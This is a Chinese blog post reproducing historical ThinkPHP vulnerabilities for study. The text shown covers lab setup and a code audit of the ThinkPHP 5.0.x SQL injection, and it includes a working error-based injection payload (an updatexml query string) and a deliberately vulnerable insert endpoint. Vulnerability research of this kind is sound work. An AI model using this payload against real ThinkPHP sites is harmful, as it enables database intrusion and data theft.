<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ThinkPHPå†å²æ¼æ´éƒ¨åˆ†å¤ç°">
<title>ThinkPHPæ¼æ´å¤ç°</title>

<link rel='canonical' href='https://fupanc-w1n.github.io/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>

<link rel="stylesheet" href="/scss/style.min.e1efb040517648e3208ef025cee1558f4e3e423656425dbd8e07546d18e42b3b.css"><meta property='og:title' content="ThinkPHPæ¼æ´å¤ç°">
<meta property='og:description' content="ThinkPHPå†å²æ¼æ´éƒ¨åˆ†å¤ç°">
<meta property='og:url' content='https://fupanc-w1n.github.io/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
<meta property='og:site_name' content='fupanc'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-07T22:09:04&#43;08:00'/><meta property='article:modified_time' content='2025-03-07T22:09:04&#43;08:00'/>
<meta name="twitter:title" content="ThinkPHPæ¼æ´å¤ç°">
<meta name="twitter:description" content="ThinkPHPå†å²æ¼æ´éƒ¨åˆ†å¤ç°">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/123_hu4212831438090465177.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ”‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">fupanc</a></h1>
            <h2 class="site-description">é—­å…³ä¿®è¡Œï¼Œä¸é—®å½’æœŸ</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/fupanc-w1n'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="https://fupanc-w1n.github.io/en/" >English</option>
                                
                                    <option value="https://fupanc-w1n.github.io/" selected>ä¸­æ–‡</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#thinkphp5-sqlæ³¨å…¥æ¼æ´">Thinkphp5 SQLæ³¨å…¥æ¼æ´</a>
          <ol>
            <li><a href="#ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</a></li>
            <li><a href="#ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</a></li>
            <li><a href="#ä¿®å¤æ–¹æ¡ˆ">ä¿®å¤æ–¹æ¡ˆ</a></li>
            <li><a href="#æ€»ç»“">æ€»ç»“</a></li>
          </ol>
        </li>
        <li><a href="#thinkphp-v6013ååºåˆ—åŒ–æ¼æ´">Thinkphp v6.0.13ååºåˆ—åŒ–æ¼æ´</a>
          <ol>
            <li><a href="#ç¯å¢ƒæ­å»º-1">ç¯å¢ƒæ­å»º</a></li>
            <li><a href="#ä»£ç å®¡è®¡åˆ†æ">ä»£ç å®¡è®¡åˆ†æ</a></li>
            <li><a href="#é—®é¢˜è§£å†³">é—®é¢˜è§£å†³</a></li>
            <li><a href="#æ€»ç»“-1">æ€»ç»“</a></li>
          </ol>
        </li>
        <li><a href="#thinkphpv800-ååºåˆ—åŒ–æ¼æ´">Thinkphpv8.0.0 ååºåˆ—åŒ–æ¼æ´</a>
          <ol>
            <li><a href="#ç¯å¢ƒæ­å»º-2">ç¯å¢ƒæ­å»º</a></li>
            <li><a href="#ä»£ç å®¡è®¡-1">ä»£ç å®¡è®¡</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86%E7%82%B9/" style="background-color: #2a9d8f; color: #fff;">
                å…¶ä»–çŸ¥è¯†ç‚¹
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHPæ¼æ´å¤ç°</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            ThinkPHPå†å²æ¼æ´éƒ¨åˆ†å¤ç°
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 07, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 14 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="thinkphpæ¼æ´å¤ç°">ThinkPHPæ¼æ´å¤ç°
</h1><p>ThinkPHPæ˜¯ä¸€ä¸ªå…è´¹å¼€æºçš„ï¼Œå¿«é€Ÿã€ç®€å•çš„é¢å‘å¯¹è±¡çš„è½»é‡çº§PHPå¼€å‘æ¡†æ¶ã€‚ä¸‹é¢å°±å¯¹å‡ ä¸ªæ¼æ´ç‚¹è¿›è¡Œå­¦ä¹ ä»¥åŠå¤ç°ã€‚</p>
<p>é¦–å…ˆéœ€è¦é…ç½®å¥½xdebugç¯å¢ƒï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ï¼š</p>
<p><a class="link" href="https://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"  target="_blank" rel="noopener"
    >https://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></p>
<h3 id="thinkphp5-sqlæ³¨å…¥æ¼æ´">Thinkphp5 SQLæ³¨å…¥æ¼æ´
</h3><p>æ¼æ´ç‰ˆæœ¬ï¼š5.0.13&lt;=ThinkPHP&lt;=5.0.15</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<h4 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º
</h4><p>è¿™é‡Œå†ç®€å•è¯´è¯´ç¯å¢ƒæ­å»ºï¼Œåé¢å…¶å®éƒ½å¤§å·®ä¸å·®çš„ã€‚åœ¨<a class="link" href="https://github.com/top-think/think/releases?page=6"  target="_blank" rel="noopener"
    >github</a>ä¸Šä¸‹è½½v5.0.15çš„æºç ï¼Œç„¶ååœ¨å°çš®ä¸­æ­å»ºä¸€ä¸ªç½‘ç«™å³å¯ï¼Œä»¥<code>composer.json</code>æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸ºæ ¹ç›®å½•ï¼Œç„¶åé…ç½®mysqlï¼Œç›´æ¥ä½¿ç”¨phpstudyä¸Šçš„å³å¯ï¼Œä½†æ˜¯éœ€è¦å¾€é‡Œé¢æ’å…¥æ•°æ®ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="n">tp_text</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="nf">users</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="nf">value</span><span class="w"> </span><span class="p">(</span><span class="s2">&#34;fupanc&#34;</span><span class="p">),(</span><span class="s2">&#34;test&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¿®æ”¹éƒ¨åˆ†æºç ï¼Œåœ¨composer.jsonä¸­æŒ‡å®šç‰ˆæœ¬ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021626244.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302162643214"
	
	
></p>
<p>è¿˜å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„phpç‰ˆæœ¬è¦æ±‚ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œå°±ç›´æ¥ä½¿ç”¨çš„7.3.4äº†ï¼Œç„¶ååœ¨è¿™ä¸ªç›®å½•ä¸‹ä½¿ç”¨<code>composer install</code>å°±åˆ›å»ºå¥½äº†ã€‚</p>
<p>ç„¶ååœ¨<code>application/index/controller/Index.php</code>ä¸­æ·»åŠ å…¥å£ç‚¹ï¼Œæ¨¡ä»¿ä¸€ä¸ªæ•°æ®æŸ¥è¯¢çš„éƒ¨åˆ†ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021628573.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302162858537"
	
	
></p>
<p>å³</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nx">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;username/a&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¿®æ”¹æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œä½äº<code>application/database.php</code>ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021630787.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302163024755"
	
	
></p>
<p>å†åœ¨<code>application/config.php</code>å¼€å¯è°ƒè¯•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="c1">// åº”ç”¨è°ƒè¯•æ¨¡å¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;app_debug&#39;</span>              <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// åº”ç”¨Trace
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;app_trace&#39;</span>              <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>phpstormçš„é…ç½®å°±æ˜¯å‰é¢ç»™çš„æ–‡ç« ï¼Œå‚è€ƒé‚£ä¸ªæ¥é…å³å¯ï¼Œç®€å•ä¿®æ”¹ä¸€ä¸‹å¦‚äººå£è·¯å¾„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021631510.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302163159474"
	
	
></p>
<p>æœ€åæˆåŠŸæ‰“ä¸Šæ–­ç‚¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021632768.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302163220728"
	
	
></p>
<p>â€”â€”â€”â€”</p>
<p>è¿™é‡Œå…¶å®å°±æ˜¯è¦ä¼ å‚usernameï¼Œå¯ä»¥å…ˆç®€å•åŠ ä¸€ä¸ªå‚æ•°æ¥è°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹ï¼Œç›´æ¥å¦‚ä¸‹é…ç½®å°±è¡Œï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021943357.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302194321268"
	
	
></p>
<h4 id="ä»£ç å®¡è®¡">ä»£ç å®¡è®¡
</h4><p>å¼€å§‹å®¡è®¡ï¼Œæ‰“é€šçš„POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜æ˜¯å…ˆä»åŸé…ç½®çš„ä¼ å‚æ¥ï¼Œç®€å•è¯´æ˜ä¸€ä¸‹è¿™é‡Œçš„æ·»åŠ çš„å…¥å£çš„ä»£ç é€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nx">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;username/a&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹äºç¬¬ä¸€è¡Œä»£ç ï¼Œå…ˆæ˜¯åˆå§‹åŒ–äº†ä¸€ä¸ªrequestå¯¹è±¡ï¼Œç„¶åè°ƒç”¨äº†get()å‡½æ•°ï¼Œè·Ÿè¿›è¿™ä¸ªget()å‡½æ•°ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503021945969.png"
	
	
	
	loading="lazy"
	
		alt="image-20250302194544925"
	
	
></p>
<p>è¿™é‡Œçš„getåœ¨ç±»ä¸­çš„æœ€åˆå®šä¹‰æ˜¯ä¸€ä¸ªç©ºæ•°ç»„ï¼Œç„¶åä¼šå°†<code>$_GET</code>ï¼ˆä¹Ÿå°±æ˜¯getä¼ å‚çš„å†…å®¹ï¼‰çš„å€¼å…¨éƒ¨èµ‹å€¼ç»™è¿™ä¸ªï¼Œç„¶åä¼šè°ƒç”¨input()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">input</span><span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// è·å–åŸå§‹æ•°æ®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="o">!=</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// è§£æname
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">list</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// æŒ‰.æ‹†åˆ†æˆå¤šç»´æ•°ç»„è¿›è¡Œåˆ¤æ–­
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">foreach</span> <span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="nv">$val</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nv">$val</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">// æ— è¾“å…¥æ•°æ®ï¼Œè¿”å›é»˜è®¤å€¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// è§£æè¿‡æ»¤å™¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFilter</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$default</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">array_walk_recursive</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="p">[</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;filterValue&#39;</span><span class="p">],</span> <span class="nv">$filter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">reset</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterValue</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span> <span class="o">!==</span> <span class="nv">$default</span><span class="p">)</span> <span class="p">{</span>
